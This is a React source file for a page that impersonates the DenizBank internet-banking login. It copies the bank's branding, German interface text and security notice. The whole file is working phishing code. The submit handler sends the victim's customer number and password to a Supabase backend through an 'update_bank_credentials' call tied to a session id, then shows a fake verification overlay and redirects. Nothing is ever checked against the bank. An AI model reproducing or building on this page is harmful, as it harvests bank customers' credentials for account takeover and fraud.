import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ChevronDown } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";

import logo from "@/assets/denizbank-logo.svg";
import bg from "@/assets/denizbank-bg.jpg";
import enbdLogo from "@/assets/enbd-logo.png";
import denizIcon from "@/assets/denizbank-icon.png";
import infoIcon from "@/assets/denizbank-info.svg";
import barrierefreiIcon from "@/assets/denizbank-barrierefrei.svg";
import sperreIcon from "@/assets/denizbank-sperreaufheben.svg";
import passwortVergessenIcon from "@/assets/denizbank-passwortvergessen.svg";
import impressumIcon from "@/assets/denizbank-impressum.svg";
import faqIcon from "@/assets/denizbank-faq.svg";
import datenschutzIcon from "@/assets/denizbank-datenschutz.svg";
import sicherheitIcon from "@/assets/denizbank-sicherheit.svg";
import gbIcon from "@/assets/denizbank-gb.svg";
import telefonIcon from "@/assets/denizbank-telefon.svg";

const PINK = "#e6007e";

const Denizbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [kundennummer, setKundennummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [lang, setLang] = useState<"DE" | "EN" | "TR">("DE");
  const [activeTab, setActiveTab] = useState<"privat" | "gemein" | "firma">("privat");
  const [saveUser, setSaveUser] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("DenizBank - Internetbanking", denizIcon);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: kundennummer,
        p_password: passwort,
        p_username_label: "Kundennummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const footerLinks = [
    { icon: impressumIcon, label: "Impressum" },
    { icon: faqIcon, label: "FAQ" },
    { icon: datenschutzIcon, label: "Datenschutz" },
    { icon: sicherheitIcon, label: "Sicherheit" },
    { icon: gbIcon, label: "Geschäftsbedingungen" },
    { icon: telefonIcon, label: "0800 88 66 00" },
  ];

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        className="min-h-screen w-full bg-cover bg-center"
        style={{ backgroundImage: `url(${bg})`, fontFamily: "'Open Sans', sans-serif" }}
      >
        <div className="min-h-screen flex flex-col bg-black/10">
          {/* Header */}
          <header className="flex items-center justify-between px-6 py-5 md:px-12">
            <img src={logo} alt="DenizBank" className="h-8 md:h-10" />
            <div className="flex items-center gap-4 md:gap-6 text-white text-sm">
              <button className="hidden md:flex items-center gap-2 hover:opacity-80">
                <img src={barrierefreiIcon} alt="" className="h-5 w-5 brightness-0 invert" />
                Barrierefrei
              </button>
              <div className="flex items-center rounded-full border border-white/80 overflow-hidden text-xs">
                {(["DE", "EN", "TR"] as const).map((l) => (
                  <button
                    key={l}
                    onClick={() => setLang(l)}
                    className={`px-3 py-1 ${lang === l ? "bg-white text-gray-800" : "text-white hover:bg-white/10"}`}
                  >
                    {l}
                  </button>
                ))}
              </div>
            </div>
          </header>

          {/* Content */}
          <main className="flex-1 px-6 md:px-12 pb-10">
            <div className="grid md:grid-cols-2 gap-8 items-center max-w-7xl mx-auto">
              {/* Linke Seite */}
              <div className="text-white">
                <h1 className="text-4xl md:text-6xl font-light leading-tight">
                  Willkommen<br />bei der DenizBank
                </h1>
                <div className="mt-10 max-w-md">
                  <div className="flex items-center gap-2 mb-2">
                    <img src={infoIcon} alt="" className="h-5 w-5 brightness-0 invert" />
                    <span className="text-lg font-semibold">Hinweis</span>
                  </div>
                  <p className="text-sm leading-relaxed">
                    Bitte teilen Sie Ihre persönlichen Anmeldedaten (Kundennummer, Passwort, TAN) niemals mit anderen Personen. Die DenizBank wird Sie niemals danach fragen.
                  </p>
                </div>
              </div>

              {/* Login Card */}
              <div className="md:justify-self-end w-full max-w-md bg-white rounded-md shadow-2xl overflow-hidden">
                {/* Tabs */}
                <div className="grid grid-cols-3 text-sm">
                  <button
                    onClick={() => setActiveTab("privat")}
                    className={`flex items-center justify-between px-4 py-3 border-b-2 ${activeTab === "privat" ? "bg-white border-transparent text-gray-800 font-semibold" : "bg-gray-100 border-gray-200 text-gray-500"}`}
                  >
                    <span>Privat</span>
                    <ChevronDown className="h-4 w-4" />
                  </button>
                  <button
                    onClick={() => setActiveTab("gemein")}
                    className={`flex items-center justify-between px-4 py-3 border-b-2 ${activeTab === "gemein" ? "bg-white border-transparent text-gray-800 font-semibold" : "bg-gray-100 border-gray-200 text-gray-500"}`}
                  >
                    <span>Gemeinsch.</span>
                    <ChevronDown className="h-4 w-4 -rotate-90" />
                  </button>
                  <button
                    onClick={() => setActiveTab("firma")}
                    className={`flex items-center justify-between px-4 py-3 border-b-2 ${activeTab === "firma" ? "bg-white border-transparent text-gray-800 font-semibold" : "bg-gray-100 border-gray-200 text-gray-500"}`}
                  >
                    <span>Firma</span>
                    <ChevronDown className="h-4 w-4 -rotate-90" />
                  </button>
                </div>

                <div className="p-6 space-y-4">
                  {/* Label row */}
                  <div className="flex items-center justify-between text-sm">
                    <label className="text-gray-700 font-medium">Login (Kundennummer)</label>
                    <div className="flex items-center gap-2">
                      <span className="text-xs text-gray-500">Benutzer speichern</span>
                      <button
                        onClick={() => setSaveUser((s) => !s)}
                        className={`relative inline-flex h-5 w-9 items-center rounded-full transition ${saveUser ? "bg-[#0066cc]" : "bg-gray-300"}`}
                      >
                        <span className={`inline-block h-4 w-4 rounded-full bg-white transition ${saveUser ? "translate-x-4" : "translate-x-0.5"}`} />
                      </button>
                      <img src={infoIcon} alt="" className="h-4 w-4" />
                    </div>
                  </div>

                  {/* Kundennummer Input */}
                  <div className="relative">
                    <input
                      type="text"
                      value={kundennummer}
                      onChange={(e) => setKundennummer(e.target.value)}
                      placeholder="Kundennummer eingeben"
                      className="h-11 w-full rounded border border-gray-300 px-3 pr-10 text-sm focus:border-[#0066cc] focus:outline-none"
                    />
                    <img src={infoIcon} alt="" className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4" />
                  </div>

                  {/* Passwort */}
                  <label className="block text-sm text-gray-700 font-medium">Passwort</label>
                  <input
                    type="password"
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    placeholder="Passwort eingeben"
                    className="h-11 w-full rounded border border-gray-300 px-3 text-sm focus:border-[#0066cc] focus:outline-none"
                  />

                  {/* Submit */}
                  <button
                    onClick={handleSubmit}
                    className="w-full h-12 rounded text-white font-semibold tracking-wider uppercase text-sm hover:opacity-90 transition"
                    style={{ background: `linear-gradient(180deg, ${PINK}, #c1006e)` }}
                  >
                    Weiter
                  </button>

                  {/* Sekundär */}
                  <div className="grid grid-cols-2 gap-3 pt-2">
                    <button className="flex items-center justify-center gap-2 h-11 rounded border border-gray-300 text-xs text-gray-700 hover:bg-gray-50">
                      <img src={sperreIcon} alt="" className="h-4 w-4" />
                      Sperre aufheben
                    </button>
                    <button className="flex items-center justify-center gap-2 h-11 rounded border border-gray-300 text-xs text-gray-700 hover:bg-gray-50">
                      <img src={passwortVergessenIcon} alt="" className="h-4 w-4" />
                      Passwort vergessen
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </main>

          {/* Footer */}
          <footer className="px-6 md:px-12 py-6 flex flex-col md:flex-row md:items-center md:justify-between gap-6">
            <div className="bg-white rounded p-2 inline-flex w-fit">
              <img src={enbdLogo} alt="ENBD" className="h-10" />
            </div>
            <div className="flex flex-wrap items-center gap-x-6 gap-y-3 text-white text-sm">
              {footerLinks.map((l) => (
                <a
                  key={l.label}
                  href="#"
                  className="flex items-center gap-2 hover:opacity-80"
                >
                  <img src={l.icon} alt="" className="h-4 w-4 brightness-0 invert" />
                  {l.label}
                </a>
              ))}
            </div>
          </footer>
        </div>
      </div>
    </>
  );
};

export default Denizbank;
